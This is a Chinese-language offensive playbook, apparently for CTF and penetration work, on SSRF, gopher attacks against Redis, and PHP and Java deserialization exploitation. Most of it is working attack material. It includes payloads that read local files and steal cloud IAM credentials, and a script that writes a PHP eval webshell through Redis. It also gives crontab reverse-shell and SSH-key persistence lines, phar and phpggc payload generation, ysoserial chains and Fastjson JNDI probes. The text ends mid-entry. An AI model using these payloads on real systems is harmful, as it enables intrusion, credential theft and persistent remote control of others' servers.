## [g-ssrf] SSRF——探测回连、协议利用到 gopher 打内网
### [ssrf-protocol] 协议利用与云元数据 | medium | SSRF;云元数据;内网扫描 | -
> 服务端组件决定可用协议，file 读文件、dict/gopher 打 TCP，云环境直奔 169.254.169.254。

#### 这个条目的作用
SSRF 触发点确认之后，利用服务端支持的协议把「能发 HTTP 请求」升级成「读服务器文件」「打内网任意 TCP 端口」「偷云上 IAM 临时凭证」，是 SSRF 从漏洞点到 getshell/接管云资产的关键一步。

#### 前置条件
- 已确认 SSRF 真实存在，且回连主体是服务器进程（不是浏览器替你发的请求）
- 服务端组件支持对应协议：curl 支持 file/dict/gopher；PHP 的 `curl` 扩展支持 gopher；Java 的 `HttpURLConnection` 只支持 http(s)；Python `requests` 不支持 gopher，需要逐个试出来
- 云元数据地址只有云环境本机能访问，先用 hostname、探测 80/8080 指纹确认目标真在云上，别在裸机空耗

#### 第 1 步：逐个探测协议支持面
把同一个 URL 参数换成不同协议，看响应差异：
```bash
# 读本地文件
?url=file:///etc/passwd
# dict 协议向任意 TCP 端口发一条命令（这里是向 Redis 发 info）
?url=dict://127.0.0.1:6379/info
# gopher 发任意原始字节（这里也是 Redis 的 info）
?url=gopher://127.0.0.1:6379/_info%0d%0a
```
预期：`file://` 返回 `/etc/passwd` 内容 = 支持文件读取；`dict://` 返回 Redis 版本信息 = 支持任意 TCP；三个都报「协议不支持 / URL 无效」= 只剩 http(s)，跳到第 5 步看绕过。

> [!tip] 探测顺序固定：http(s) 是否可达 → 是否禁 localhost/内网（换绕过表）→ 是否支持 file/dict/gopher。一次探测把三种协议都发出去，少一轮请求。

#### 第 2 步：file 协议读本地文件
```bash
?url=file:///etc/passwd
?url=file:///proc/self/environ
?url=file:///var/www/html/config.php
```
预期：读到 `/etc/passwd` 即确认任意文件读取；`/proc/self/environ` 一次拿全环境变量，数据库口令、密钥、flag 往往直接出现；`config.php` 是 Web 目录里最常见的凭证文件。

#### 第 3 步：dict 协议扫内网端口、发 Redis 命令
```bash
# Redis 协议探测：dict:// 会把 / 后面的内容当作一行命令发给目标端口
?url=dict://127.0.0.1:6379/info
?url=dict://127.0.0.1:6379/ping
# 普通 http 也能当端口扫描器：用响应长度、耗时、报错内容区分端口开闭
?url=http://127.0.0.1:6379/
?url=http://127.0.0.1:8080/
?url=http://127.0.0.1:3306/
```
预期：`dict://.../ping` 返回 `+PONG` 说明内网 Redis 未授权可达；6379/8080/3306 端口用响应差异就能画出内网资产表。

#### 第 4 步：云环境打元数据服务
| 云厂商 | 地址 | 常用路径 |
| --- | --- | --- |
| AWS | http://169.254.169.254 | /latest/meta-data/iam/security-credentials/ |
| 阿里云 | http://100.100.100.200 | /latest/meta-data/ram/security-credentials/ |
| GCP | http://metadata.google.internal | /computeMetadata/v1/instance/service-accounts/default/token |
| 腾讯云 | http://metadata.tencentyun.com | /latest/meta-data/cvm/security-credentials/ |

```bash
# AWS 拿凭证两连击：先列角色名，再取该角色的临时凭证（AccessKeyId/SecretAccessKey/Token）
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
GCP 的元数据要求 `Metadata-Flavor: Google` 请求头，只有实现允许注入自定义请求头时才能打；AWS/阿里云/腾讯云直接 GET 就行。

#### 第 5 步：被拦截时按绕过表升级
| 技巧 | 示例 | 适用场景 |
| --- | --- | --- |
| @ 用户信息 | `http://example.com@169.254.169.254/` | 校验只取 host 字符串 |
| IP 进制变形 | `http://0x7f000001/`、`http://2130706433/`、`http://127.1/` | 黑名单只挡字面 localhost/127.0.0.1 |
| 30x 重定向 | 自己服务器返回 302 → 169.254.169.254 | 校验后服务端跟随跳转 |
| DNS 重绑定 | 首次解析到公网 IP 过白名单，二次解析到 127.0.0.1 | 白名单按域名放行 |
| 双编码 | `%2569` 先 URL 编码再编码 | 过滤器只解码一次 |

> [!warn] 元数据地址只在云环境本机可达；目标是裸机时这条路直接跳过，别在 169.254.169.254 上浪费时间。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `file://` 返回空/报错 | 目标组件不支持 file 协议，或相对路径定位错 | 换绝对路径 `file:///etc/passwd`；不支持就转 http(s) 内网探测 |
| `dict://` 无响应 | 目标端口没开，或组件只放行 http(s) | 先确认端口开放；确认不支持 dict 后放弃该协议 |
| 元数据请求一直超时 | 目标不在云上，或元数据地址被出口防火墙挡 | 用 hostname/指纹确认云厂商；裸机直接跳过本步 |
| 只回显「URL 无效」 | 协议白名单把非 http(s) 全拦了 | 走绕过表，不行就回到 http(s) 内网扫描路线 |

#### 实战要点
- 协议探测三连发（file + dict + gopher）一次请求测完，省轮次
- 拿到 file 读取后先读 `/proc/self/environ`，信息密度最高
- dict 只能逐条发命令，Redis 写 shell 这种多命令场景要交给 gopher（见 ssrf-redis）
- 云元数据按「确认在云 → 列角色 → 取凭证」三步走，凭证只用来调云 API，不直接当 RCE
- 所有绕过都建立在「过滤器只做字符串/一次解码」的假设上，先发字面 payload 确认过滤规则再选绕过方式

### [ssrf-redis] gopher 打 Redis 写 Webshell | hard | SSRF;gopher;Redis | -
> gopher 协议能向任意 TCP 端口发送原始字节，经典场景：内网未授权 Redis 写 Web 目录拿 Webshell。

#### 这个条目的作用
SSRF 只能发 HTTP 时打不穿 Redis 这类 TCP 服务，gopher 协议让服务端把任意原始字节发到任意端口，配合未授权 Redis 的 `CONFIG SET` + `SAVE` 把 PHP 代码写进 Web 目录，完成 SSRF → Webshell 的完整升级。

#### 前置条件
- 内网 Redis 未授权访问（`dict://127.0.0.1:6379/info` 能回版本信息即确认）或弱密码
- Redis 所在主机有可写 Web 目录（`/var/www/html`、`/usr/share/nginx/html` 等），且知道 Web 根目录绝对路径
- SSRF 组件支持 gopher 协议（PHP curl 扩展支持；Python requests 不支持）
- 目标 Redis 是你能打的靶：`SAVE` 会覆盖同目录同名文件，`FLUSHALL` 会清库，别在别人的生产实例上乱来

#### 第 1 步：确认 Redis 可达且未授权
```bash
# 两条都通 = 未授权 Redis，进入下一步
?url=dict://127.0.0.1:6379/info
?url=dict://127.0.0.1:6379/ping
```
预期：返回 `# Server` 开头的版本信息和 `+PONG`。如果返回 `-ERR operation not permitted` 说明有密码，SSRF 场景基本放弃这条链（gopher 一次只能发固定字节，不支持交互认证）。

#### 第 2 步：用模板生成 gopher 串（长度自动计算）
把下面的脚本存成 `gen_gopher_redis.py` 本地运行：
```python
import urllib.parse

def cmd(name, *args):
    # 每条命令按 RESP 协议编码：*N 参数个数 + $len 长度 + 内容
    s = f"*{len(args)+1}\r\n${len(name)}\r\n{name}\r\n"
    for a in args:
        b = a.encode()
        s += f"${len(b)}\r\n{a}\r\n"
    return s

shell = "<?php eval($_POST['x']);?>"
lines = (
    cmd("set", "1", shell) +                          # 把代码写进 key=1
    cmd("config", "set", "dir", "/var/www/html") +    # 切换工作目录到 Web 根
    cmd("config", "set", "dbfilename", "shell.php") + # 落盘文件名
    cmd("save")                                       # 触发写盘
)
url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(lines, safe="")
print(url)
```
```bash
python3 gen_gopher_redis.py
```
预期：输出一行 `gopher://127.0.0.1:6379/_%2a%34%0d%0a...` 的超长 URL。原理：`_` 是不被发送的占位符，`%0d%0a` 解码后就是 CRLF，服务端把整段字节原样发到 Redis 的 6379 端口。

> [!tip] `\r\n` 是换行占位，脚本里必须写真正的 `\r\n` 转义而不是 `\\r\\n`，否则生成的长度和内容对不上，Redis 直接报协议错误。

#### 第 3 步：把 gopher URL 塞进 SSRF 参数触发
```bash
# 把上一步打印出的完整 gopher 串替换 <GOPHER_URL>
curl -s 'http://t/ssrf?url=<GOPHER_URL>'
```
预期：请求无报错回显（SSRF 通常不回显 Redis 输出）。如果返回 Redis 的 `ERR` 之类内容，说明命令没编对，回第 2 步核对。

#### 第 4 步：验证 Webshell
```bash
# 触发 SSRF 后访问落盘的 shell.php，POST 参数 x 即 eval 的内容
curl -s 'http://t/shell.php' -d 'x=system("id");'
```
预期：返回 `uid=33(www-data) gid=33(www-data)`。没回显就换 `x=file_put_contents("/tmp/t.txt","ok");` 再读 `/tmp/t.txt` 确认代码真的执行了。

#### 第 5 步：写不进 Web 目录时换落盘目标
Redis 写盘的本质是「往任意可写目录写一个内容可控的文件」，Web 目录没权限就换目标：
```bash
# crontab 反弹：值改成一行计划任务
cmd("set", "1", "\n\n*/1 * * * * bash -i >& /dev/tcp/你的IP/4444 0>&1\n\n")
cmd("config", "set", "dir", "/var/spool/cron")
cmd("config", "set", "dbfilename", "root")
cmd("save")

# SSH 公钥：值改成你的公钥内容
cmd("set", "1", "\n\nssh-rsa AAAAB3NzaC1yc2E... your@key\n\n")
cmd("config", "set", "dir", "/root/.ssh")
cmd("config", "set", "dbfilename", "authorized_keys")
cmd("save")
```
crontab 适合 root 运行 Redis 的场景；公钥适合能猜中 `~/.ssh` 路径的场景。两者的值都要用前后空行包裹，避开 RDB 文件头的二进制垃圾。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| Redis 返回 `ERR unknown command` | gopher 串里 CRLF 编错（`\\r\\n` 写成了字面） | 用模板脚本生成，别手写；核对 `%0d%0a` |
| 访问 shell.php 下载而非执行 | 写盘成功但目录不在 Web 根，或 Nginx 不解析该目录 | 确认 `config set dir` 用的是 Web 根绝对路径；先传 `1.php.jpg` 探解析 |
| shell.php 内容乱码 | RDB 文件头的二进制垃圾和代码粘在一起 | 值前后加 `\n\n`；把 `<?php` 放在 key 值的开头且前面留空行 |
| `ERR Changing directory: No such file or directory` | dir 路径不存在 | 换存在的可写目录，或换 crontab/公钥路线 |
| 触发后无任何文件生成 | Redis 有密码/内网不通/gopher 不支持 | 回到第 1 步逐项确认；gopher 不支持就放弃本条链 |

> [!warn] 前提缺一不可：Redis 未授权或弱密码、内网可达、目标目录可写。`flushall` 破坏性强，确认这是你自己打的靶再带。

#### 实战要点
- 永远用脚本生成 gopher 串，手写必错；长度、CRLF、百分号编码全靠 `urllib.parse.quote`
- dict 一次只能发一条命令，gopher 一次发完整命令序列，能 gopher 绝不 dict
- 写盘后用 `/proc/self/environ` 或读配置确认 Web 根路径再写，别盲猜
- 值里加 `\n\n` 包裹是防 RDB 二进制头污染代码的保命姿势
- crontab 利用要求 Redis 以 root 运行且 cron 服务存在，先确认再选变体

## [g-deser-php] PHP 反序列化——格式、魔术方法与 POP 链
### [deser-php-serialize] serialize 格式与魔术方法 | easy | 反序列化;PHP;魔术方法 | -
> PHP 对象被序列化为可读字符串，反序列化入口可控时借魔术方法触发危险行为。

#### 这个条目的作用
这是 PHP 反序列化的地基：看懂 `serialize()` 输出的字符串格式，能手工构造或修改对象串；背下魔术方法触发时机，知道反序列化到哪一步会「顺便」调用危险代码。没有这个基础，后面 POP 链、phar、phpggc 全是空中楼阁。

#### 前置条件
- 目标 PHP 代码里有 `unserialize()` 或等价入口（session 反序列化、`__PHP_Incomplete_Class` 等）
- 你能向入口传入任意字符串（GET/POST 参数、Cookie、文件内容）
- 本地有 PHP 环境（`php -r` 即可）用来生成和验证序列化串

#### 第 1 步：看懂序列化格式
```php
// 一个对象序列化后长这样：
O:7:"Article":3:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;s:5:"score";i:100;}
```
逐段拆解：`O` 是对象（object），`7` 是类名字节数，`"Article"` 是类名，`3` 是属性个数，花括号里是「类型+长度+值」成对出现的属性。所有长度都是字节数，不是字符数。

| 类型 | 格式 | 例子 |
| --- | --- | --- |
| null | N; | N; |
| bool | b:1; / b:0; | b:1; |
| int | i:100; | i:100; |
| string | s:5:"hello"; | s:5:"hello"; |
| array | a:2:{k;v;k;v} | a:2:{i:0;s:1:"a";i:1;s:1:"b";} |
| object | O:7:"Class":2:{...} | 见上方 |
| 私有/保护属性 | 名字带 `\0` 前缀 | 私有属性 `name` 序列化为 `s:11:"\0Article\0name";`（长度包含两个 null 字节） |

> [!warn] `\0` 是真正的空字节（0x00），不是两个字符。私有属性 `s:11:"\0Article\0name"` 的长度 11 = 1(null) + 7(Article) + 1(null) + 4(name) 减去引号，数错长度整个串解析失败。

#### 第 2 步：手写/修改一个对象串
```php
<?php
// 本地验证：把字符串塞给 unserialize，确认目标版本能解析
$payload = 'O:1:"A":1:{s:3:"cmd";s:2:"id";}';
$obj = unserialize($payload);
var_dump($obj); // 得到 A 类对象，cmd 属性为 "id"
?>
```
```bash
php -r '$o = unserialize("O:1:\"A\":1:{s:3:\"cmd\";s:2:\"id\";}"); var_dump($o);'
```
预期：能打印出对象即格式正确。改属性值时记住三件事：类名长度要同步改、字符串长度要同步改、`i:`/`b:` 类型别写错。

#### 第 3 步：背下魔术方法触发时机
| 方法 | 触发时机 | 利用方向 |
| --- | --- | --- |
| __wakeup() | 反序列化完成时自动调用 | 属性重置、绕过的起点 |
| __destruct() | 对象销毁时（脚本结束/引用归零） | 最常用的 RCE 出口 |
| __toString() | 对象被当字符串用（拼接/echo） | 文件操作、正则、拼接场景 |
| __call() | 调用不存在的方法 | 转发到危险函数 |
| __get() / __set() | 读写不可访问属性 | 链式取值传递 |
| __invoke() | 对象被当函数调用 | 常见链尾 |

> [!tip] 利用本质 = 入口可控（unserialize 参数） + 出口危险（sink）+ 中间有魔术方法搭桥。先找出口再回头找入口，别从入口硬推。

#### 第 4 步：找入口和出口
- 找入口：全局搜 `unserialize(`、`unserialize`（注意 session 处理器用 `session.serialize_handler` 序列化 session 数据，Cookie 里 `Tzo...` 开头的 base64 串也是典型入口）
- 找出口：`eval` `system` `exec` `assert` `call_user_func` `include` `file_put_contents` 是五大常见 sink

```bash
# 入口验证：随便传一个合法对象串，看响应/报错是否出现类相关行为
curl -s 'http://t/?data=O:1:%22A%22:1:%7Bs:3:%22cmd%22;s:2:%22id%22;%7D'
```

#### 第 5 步：验证 __wakeup 绕过（老版本）
CVE-2016-7124：把属性计数改大，老版本 PHP 会跳过 `__wakeup()` 直接继续反序列化（PHP 7.4 前受影响）：
```txt
# 原本
O:7:"Article":2:{...}
# 绕过：把 2 改成 3，属性实际只有 2 个
O:7:"Article":3:{...}
```
> [!warn] PHP 7.4+ 已修复此绕过；先用 `php -v` 或报错回显确认版本再决定是否依赖它。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| `unserialize(): Error at offset` | 长度写错（类名/字符串字节数不对） | 用 `serialize()` 生成再改，别手写长度 |
| 属性值没生效 | 私有属性没加 `\0Class\0` 前缀 | 按可见性补前缀，或把属性改成 public 重新序列化 |
| 没有触发任何魔术方法 | 入口不在你传的地方，或类没被加载 | 先传合法串看类是否加载；确认入口再谈触发 |
| 中文内容串解析失败 | 长度按字符数而不是字节数算了 | 中文字符占 3 字节，长度按 `strlen()` 算 |

#### 实战要点
- 构造 payload 一律本地 `serialize()` 生成再改，长度和转义全自动，别手工拼
- 入口确认比链子重要：先花一个请求验证「传进去的串真的被 unserialize」，再构造链
- 私有属性名里的 `\0` 在 URL 传递时必须 `%00` 编码，否则被过滤或截断
- 反序列化对象不要求类存在：不存在的类会变成 `__PHP_Incomplete_Class`，所以目标源码里的类必须能自动加载才有效果

### [deser-php-pop] POP 链构造思路 | hard | 反序列化;POP链;代码审计 | -
> 无现成链时，在应用自身类里找"可控属性 → 魔术方法 → 危险函数"的调用链。

#### 这个条目的作用
phpggc 只有通用框架链，CTF 和实战里目标常用自研类，没有现成链可用。POP（Property-Oriented Programming）就是自己审计目标源码，把「反序列化可控的属性」通过一串魔术方法调用，最终导向 `eval`/`system` 等危险函数，手工拼出专属链。

#### 前置条件
- 已确认 `unserialize()` 入口可控（见 deser-php-serialize）
- 能拿到目标 PHP 源码（审计题直接给源码；黑盒先 LFI/备份文件拖源码）
- 本地有同版本 PHP 环境，方便生成和验证 payload

#### 第 1 步：找 sink（危险函数出口）
在源码里全局搜这些函数，记下每个调用点：
```php
eval( $x );  system( $x );  exec( $x );
call_user_func( $cb, ... );  include( $file );
file_put_contents( $file, $data );  assert( $x );
```
对每个 sink 问三个问题：参数来自哪里？是类属性吗？属性在反序列化时可控吗？三个「是」就是候选链尾。例如 `class A { public $cmd; function __destruct(){ system($this->cmd); } }` 就是最简链尾。

#### 第 2 步：找 gadget（能调用 sink 的方法）
gadget 是「方法里调用了危险函数、且参数来自本对象属性」的方法。重点看：
- `__destruct()` / `__wakeup()` / `__toString()` 这三个入口方法体里调了什么
- 被调方法的参数是否来自 `$this->xxx` 属性
- 属性是否有类型/长度限制（有就绕不过，换一条）

```php
// 典型 gadget：__destruct 里把属性传给了危险调用
class Cache {
    public $file;
    public $content;
    public function __destruct() {
        file_put_contents($this->file, $this->content); // 属性直达 sink
    }
}
```

#### 第 3 步：拼链——从入口魔术方法倒推
从自动触发的魔术方法出发，反着推：谁调用了它？它的参数能否被前一个对象的属性控制？一直推到所有「中间值」都是可反序列化的属性为止：
```txt
反序列化 → __wakeup/__destruct/__toString（自动触发）
        → 调用 $this->handler->someMethod()（handler 是另一个可控对象）
        → 那个对象的方法里 eval/system($this->cmd)（cmd 属性可控）
```
要点：链中每个「跳板对象」都必须能实例化、属性全可控、类能被目标自动加载。链越长越容易断在环境差异上。

#### 第 4 步：本地搭同版本环境生成 payload
别手写序列化串，本地写脚本生成：
```php
<?php
// payload_gen.php：从目标源码里把链上所有类复制过来，本地生成
class A {
    public $cmd = "id";
    public function __destruct() { system($this->cmd); }
}
echo serialize(new A());
// 输出：O:1:"A":1:{s:3:"cmd";s:2:"id";}
?>
```
```bash
php payload_gen.php > payload.txt
# URL 传递时对 \0 做百分号编码
python3 -c "import urllib.parse,sys; print(urllib.parse.quote(open('payload.txt').read().strip(), safe=''))"
```
预期：输出合法序列化串。私有/保护属性的 `\0` 会在输出里以真实空字节存在，URL 传递必须编码。

> [!tip] 先写最小链验证入口：比如让 `__destruct` 里执行 `file_get_contents("http://你的dnslog/".$this->cmd)`，收到 DNS 记录证明入口 + 链路通了，再换真正的 RCE 链尾。

#### 第 5 步：投递与验证
```bash
curl -s 'http://t/?data=<URL编码后的payload>'
# 无回显就换带外确认：链尾改成访问 dnslog
curl -s 'http://t/?data=<payload让对象访问http://xxx.dnslog.cn>'
```
预期：回显 `id` 命令输出，或 DNSLog 平台出现记录。都没有就检查类加载和版本差异。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 生成串解析失败 | 属性数/长度/可见性前缀写错 | 只改属性值，用 `serialize()` 原生输出 |
| 链子不触发 | 中间跳板类没被目标加载，或方法签名不匹配 | 确认目标能 `autoload` 链上所有类；换更短链 |
| 本地通、目标不通 | PHP 版本差异（`__wakeup` 绕过、函数行为） | 目标什么版本本地就什么版本 |
| `\0` 传过去就断 | 空字节被过滤/截断 | URL 用 `%00` 编码后再发 |
| 有链但无回显 | sink 在但输出被吞 | 换 `file_put_contents` 落盘或 DNSLog 带外确认 |

#### 实战要点
- 链越短越好：优先 `__destruct` 直达 sink 的一跳链，再考虑 `__toString` 两跳，长链留到最后
- sink 决定链尾，入口决定起点，中间全靠「属性可控 + 方法自动调用」搭桥
- 所有中间对象属性都要能在序列化串里写死，运行期不可控的属性直接判死
- 每步验证都用最小改动：先让链「跑起来」（DNSLog），再换真正利用（命令执行）
- 审计时优先看 `__destruct`/`__wakeup` 的方法体，它们不依赖外部调用，反序列化必然触发

### [deser-php-phar] phar 反序列化与 phpggc | medium | 反序列化;phar;phpggc | -
> phar 文件元数据存序列化数据，任何触发 phar:// 的文件操作都会反序列化元数据（PHP 8 前）。

#### 这个条目的作用
普通反序列化需要 `unserialize()` 入口，找不到入口就卡死。phar 把反序列化入口扩展到「任何能处理 `phar://` 协议的文件函数」——`file_exists`、`getimagesize`、`file_get_contents` 都行。配合 phpggc 一键生成现成链，是「有文件操作函数、无 unserialize 入口」场景的破局点。

#### 前置条件
- 目标 PHP < 8.0（PHP 8.0 起 phar 元数据不再自动反序列化，8.x 上此路不通）
- 能上传一个文件（后缀随意，可伪装成图片）或控制一个文件路径
- 目标代码里有对可控路径调用文件函数的点：`include` `file_exists` `getimagesize` `file_get_contents` 等
- 本地 PHP 环境用来生成 phar（需关闭 `phar.readonly`）

#### 第 1 步：确认目标版本与触发面
```bash
# 看有没有 phpinfo 或报错泄露版本
curl -s 'http://t/phpinfo.php' | grep 'PHP Version'
```
预期：拿到版本号。PHP < 8.0 可继续；8.0+ 的 metadata 反序列化被限制，优先换别的路线（普通 unserialize 入口）。

#### 第 2 步：写 phar 生成脚本
```php
<?php
// phar_gen.php：生成恶意 phar，元数据里塞一个带 __destruct 的对象
class Evil {
    public $cmd = "id";
    public function __destruct() { system($this->cmd); }
}
$p = new Phar("p.phar");
$p->startBuffering();
$p->setStub("<?php __HALT_COMPILER(); ?>"); // stub 以 __HALT_COMPILER(); 结尾才是合法 phar
$p->addFromString("a", "a");
$p->setMetadata(new Evil()); // 关键：元数据被序列化存进 phar
$p->stopBuffering();
rename("p.phar", "p.jpg"); // 伪装成图片；phar 结构在前缀加 GIF89a 也不破坏
?>
```
```bash
php -d phar.readonly=0 phar_gen.php
```
预期：生成 `p.jpg`。`setStub` 里 `__HALT_COMPILER();` 缺一不可，否则不是合法 phar，触发时直接报错。

> [!warn] 生成必须 `-d phar.readonly=0`（默认 1 禁止创建 phar）。改后缀不影响 phar 内部结构，加 `GIF89a` 前缀也不破坏合法性。

#### 第 3 步：找触发点
不限于 `include`，所有能处理 `phar://` 协议的文件函数都是入口：
```php
include("phar://upload/p.jpg");
file_exists("phar://upload/p.jpg");   // 文件操作函数均可触发
getimagesize("phar://upload/p.jpg");  // 读图片的接口也危险
file_get_contents("phar://upload/p.jpg");
```
找目标代码里参数可控的文件函数调用（`$_GET['file']`、上传文件路径拼接等），把路径前缀换成 `phar://`：
```bash
# 例：目标有 ?page= 参数被 include 或 file_exists
curl -s 'http://t/?page=phar://uploads/p.jpg'
```
预期：触发元数据反序列化 → `__destruct` 执行 `id`，回显或带外收到结果。

#### 第 4 步：phpggc 一键生成（有现成框架链时）
```bash
# 列出所有可用链及适用版本
php phpggc -l
# 生成 phar 格式 payload（-p phar 输出 .phar 文件，-o 指定输出）
php phpggc -p phar -o shell.phar Laravel/RCE1 system 'id'
# 生成普通序列化串（配合 unserialize 入口）
php phpggc Laravel/RCE1 system 'id'
```
预期：输出 payload 文件/字符串。链名按目标框架选（Laravel、Symfony、ThinkPHP、Monolog 等），`phpggc -l` 输出里有「适用版本」列，先核对目标版本再选。

#### 第 5 步：投递与验证
```bash
# 上传 shell.phar（改名为 shell.jpg 过白名单）→ 用触发点打
curl -s 'http://t/?page=phar://uploads/shell.jpg'
# 无回显链：命令换成 DNSLog 探测
php phpggc -p phar -o shell.phar Laravel/RCE1 system 'curl http://xxx.dnslog.cn'
```
预期：命令执行结果回显，或 DNSLog 收到记录。确认后再换真正的反弹 shell / webshell 命令。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 生成时 `Cannot create phar` | `phar.readonly=1` | 加 `-d phar.readonly=0` |
| 触发时报 `phar ... is not a valid phar archive` | stub 少了 `__HALT_COMPILER();` | 补全 stub；确认脚本没被二次加工 |
| 无任何反应 | PHP 8.0+ 已禁 metadata 反序列化，或目标函数不支持 phar:// | 换普通 unserialize 入口；确认版本 < 8.0 |
| `file_exists` 类函数不报错也不执行 | 目标函数白名单过滤了 phar:// 前缀 | 试 `compress.zlib://phar://...` 或换 include 类入口 |
| phpggc 链生成成功但不执行 | 框架版本不匹配链的适用区间 | `php phpggc -l` 核对版本列，换匹配链 |

> [!tip] phar 利用面广：文件上传点 + 任意文件操作函数即可打，不需要 include 参数。先看目标 PHP 版本再决定值不值得走这条路。

#### 实战要点
- 触发点优先找 `file_exists`/`getimagesize` 这类「看起来无害」的函数，白名单往往只防 include
- phar 文件可以加图片头、改任意后缀，上传限制基本拦不住
- phpggc 的 `-l` 输出带适用版本，选链前先核对，别拿 Laravel 链打 ThinkPHP
- 无回显一律先 DNSLog：链尾命令改成 `curl http://dnslog.cn` 确认执行再换重活
- 生成端和目标端 PHP 版本要一致，序列化格式差异会让链在目标端直接断

## [g-deser-java] Java 反序列化——ysoserial、Fastjson 与 Shiro
### [deser-java-ysoserial] ysoserial 生成与链速查 | medium | 反序列化;Java;ysoserial | -
> ObjectInputStream.readObject 入口可控时，用 ysoserial 生成 gadget 链 payload 打命令执行。

#### 这个条目的作用
Java 反序列化漏洞的通用打法：`ObjectInputStream.readObject()` 处理不可信数据时，如果 classpath 里存在 gadget 库（commons-collections 等），就能借库里的类拼出「反序列化 → 命令执行」的调用链。ysoserial 就是现成链生成器，一条命令产出二进制 payload。

#### 前置条件
- 目标存在 `readObject` 类入口（Java 原生反序列化：参数、Cookie、请求体里直接放二进制/Base64 序列化数据）
- 本机有 JDK（8 即可）和 ysoserial.jar；`java -jar ysoserial.jar` 能跑起来
- 一个 DNSLog 平台（dnslog.cn 等）用于带外探测

#### 第 1 步：准备 ysoserial
```bash
# 从 GitHub 下载 ysoserial.jar（release 或自己 mvn package 构建）
java -jar ysoserial.jar --help
```
预期：打印全部可用链列表。列表里 `URLDNS` 必须第一优先记下来——它不依赖任何第三方库，JDK 自带就能跑。

#### 第 2 步：URLDNS 探测入口（永远第一步）
```bash
# URLDNS 只发 DNS 请求，不执行命令：目标反序列化这个 payload 时，DNSLog 会收到解析记录
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" > probe.bin
# 投递方式按目标接口定，例如 base64 放进参数
base64 -w0 probe.bin
```
预期：DNSLog 平台出现 `xxx.dnslog.cn` 的解析记录 = 反序列化入口确认存在。URLDNS 通只证明入口存在，不证明任何链可用。

> [!tip] 探测优先级：URLDNS 通 → 才有意义继续试命令执行链；URLDNS 不通就别在链子上浪费时间，先找入口。

#### 第 3 步：按依赖选链生成 payload
```bash
java -jar ysoserial.jar CommonsCollections6 "id" > cc6.bin
java -jar ysoserial.jar CommonsCollections5 "id" > cc5.bin
java -jar ysoserial.jar CommonsBeanutils1 "id" > cb1.bin
```
| 链 | 依赖 | 备注 |
| --- | --- | --- |
| URLDNS | JDK 自带 | 只探测，首选确认入口 |
| CommonsCollections1-3 | commons-collections 3.x | 3.2.2 加反序列化白名单后失效 |
| CommonsCollections5/6 | commons-collections 3.1-3.2.1 | 5 适合 JDK8 老版本；6 通用 |
| CommonsCollections4 | commons-collections 4.x | 打 4.0-4.1 |
| CommonsBeanutils1 | commons-beanutils | 依赖常见，广泛备选 |

> [!warn] gadget 依赖不匹配直接报错或无回显。URLDNS 通只证明入口存在，链子要按目标 classpath 里实际存在的库来选——依赖缺失的链一打就废。

#### 第 4 步：投递 payload
三种常见投递形态，按目标接口的解码习惯选：
```bash
# 1) 参数 base64
curl -s 'http://t/api?data='"$(base64 -w0 cc6.bin)"
# 2) POST 体直接放原始二进制（很多框架自动按 Base64/Hex 解码）
curl -s -X POST 'http://t/api' --data-binary @cc6.bin
# 3) 十六进制编码
xxd -p cc6.bin | tr -d '\n'
```
预期：接口按约定解码后交给 `readObject`，链触发命令执行。

#### 第 5 步：带外确认命令执行
无回显是常态，命令改用 DNSLog 确认：
```bash
java -jar ysoserial.jar CommonsCollections6 "ping xxx.dnslog.cn" > cc6_dns.bin
# 投递后去 DNSLog 平台看解析记录
```
预期：DNSLog 出现 `xxx.dnslog.cn` 的解析记录 = 命令执行成功。然后换正式命令（反弹 shell、写 webshell）重生成一次即可。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| URLDNS 有记录但 CC 链无反应 | classpath 里没有对应库或版本不对 | 换链（CC5↔CC6↔CB1）逐个试；CB1 依赖最可能凑巧存在 |
| 直接报 `ClassNotFoundException` | 依赖库缺失 | 链名和依赖表对照，选目标确有的库 |
| `com.sun.org.apache...` 报错 | CC5 在 JDK 新版本上失效 | 换 CommonsCollections6 |
| 命令执行无回显 | sink 输出被吞 | 一律改 DNSLog 带外命令确认 |
| Base64 投递失败 | 接口按 Hex 或原始二进制解码 | 换投递形态，跟目标解码习惯对齐 |

#### 实战要点
- 流程固定：URLDNS 确认入口 → 按依赖选链 → 带外确认执行 → 换正式命令
- CC6 通用性最高优先试；CC1-3 在 commons-collections 3.2.2+ 直接失效
- 目标 JDK 版本影响链可用性，CC5 只适合老 JDK8
- 无回显一律 DNSLog，别猜执行没执行
- 命令里有特殊字符（`|`、`&`、空格）时注意 ysoserial 的参数转义，先跑 `ping dnslog` 这种最简命令

### [deser-java-fastjson] Fastjson autoType 利用 | medium | Fastjson;autoType;反序列化 | -
> Fastjson 反序列化 JSON 时 @type 可控（1.2.24 全开、1.2.47 有 cache 绕过），可触发 JNDI 注入。

#### 这个条目的作用
Fastjson 解析 JSON 时遇到 `@type` 字段会按字符串实例化任意类，配合 `JdbcRowSetImpl` 这类「属性赋值即发起 JNDI 查询」的类，把类加载引到攻击者控制的 LDAP/RMI 服务，服务返回恶意类后目标加载并执行，完成 JSON → RCE。不同版本利用姿势不同，先探版本再选 payload。

#### 前置条件
- 目标使用 Fastjson 解析你可控的 JSON（Content-Type: application/json 的接口）
- 攻击机有公网可达的地址，能起 LDAP/HTTP 服务（marshalsec + 恶意 class 或 JNDIExploit）
- 目标 JDK 能加载远程类：JDK < 8u191 默认允许 LDAP 远程类加载；8u191+ 需要其他 gadget 姿势（如配合本地 classpath 链）

#### 第 1 步：探测版本与解析行为
```bash
# 传一个不存在的类，看报错回显泄露版本/autoType 状态
curl -s -X POST 'http://t/api' -H 'Content-Type: application/json' \
  -d '{"@type":"com.foo.NotExist"}'
# DNSLog 探测：解析成功且支持 java.net 类即确认 fastjson 解析了 @type
curl -s -X POST 'http://t/api' -H 'Content-Type: application/json' \
  -d '{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}'
```
